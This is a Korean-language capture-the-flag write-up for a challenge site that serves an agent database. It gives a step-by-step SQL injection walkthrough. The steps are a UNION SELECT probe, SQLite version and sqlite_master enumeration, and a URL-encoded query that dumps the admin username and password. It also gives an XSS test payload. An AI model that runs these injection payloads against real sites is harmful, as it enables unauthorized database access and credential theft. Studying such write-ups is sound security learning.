# 문제명

## 문제 설명

> We found an exposed enpoint on the old XSS's server. They used it to manage their agents database but it seems that we can't get any valuable information without admin access to the application...

- http://chal-cfbaf3b1.ctf.thcon.party

## 풀이

### 분석

링크에 접속하면 `login | dashboard` 링크와 함께 `Agent database`라는 제목, 그리고 숫자만 입력 가능한 입력란이 존재한다. ctrl+U로 확인한 메인 페이지 HTML 코드 중 핵심 부분은 다음과 같다 
```html
<form method="get" action="/">
    <input type="number" name="id">
</form>
<a href="/view-result"> click here to view the search results </a>
``` 
입력란에 넣은 값에 따라 URL이 http://chal-cfbaf3b1.ctf.thcon.party/?id=1234 이런식으로 바뀐다.(1234 입력한 경우) 이후에 /view-result로 이동하면 검색 결과를 확인할 수 있다. 즉 해당 서버는 id 값을 이용해 agent 정보를 조회하고, 그 결과를 /view-result에서 보여주는 방식이다.
### 취약점

처음에는 문제 이름에 XSS가 포함되어 있어서 /?id=<img src=x onerror=alert(1)> 로 XSS를 시도했었는데 alert가 실행되지 않았다. id 파라미터가 SQL 쿼리에 사용되는지 확인하기 위해 /?id=0 UNION SELECT 1,2-- - 를 해보니 /view-result에서 1 | 2가 출력되었고, SQL Injection이 가능함을 확인하였다.

SQL Injection: id 파라미터가 서버의 SQL 쿼리에 안전하게 처리되지 않고 직접 삽입되고 있으므로 쿼리 조작 가능
XSS: SQL Injection을 통해 /view-result에 출력되는 agent 검색 결과를 조작 가능, 결과가 HTML escape 없이 출력, XSS 실행


### 익스플로잇

1. XSS 동작 확인
    먼저 UNION SELECT를 이용해 description 컬럼에 XSS payload를 삽입. 이후 /view-result에 접속하면 alert(1)이 실행 혹인
2. DB 종류 확인
    SQLite 함수인 sqlite_version()을 사용하여 /view-result에서 DB 버전 확인(db,3.46.1)
3. 테이블 목록 확인
    sqlite_master 테이블을 통해 테이블 이름과 생성 쿼리를 확인 
    adminDBtable    CREATE TABLE adminDBtable (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT)
    agents          CREATE TABLE agents (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, description TEXT)
    sqlite_sequence CREATE TABLE sqlite_sequence(name,seq)
4. admin 계정 정보 조회
    username, password 조회: /?id=0%20UNION%20SELECT%20username,password%20FROM%20adminDBtable--%20-
    결과: admin, S_P3rSicreteP3asseworde%%
5. admin 로그인 후 flag 확인
    /login 페이지에서 username: admin, password: S_P3rSicreteP3asseworde%% 입력하여 로그인 하니 flag 출력
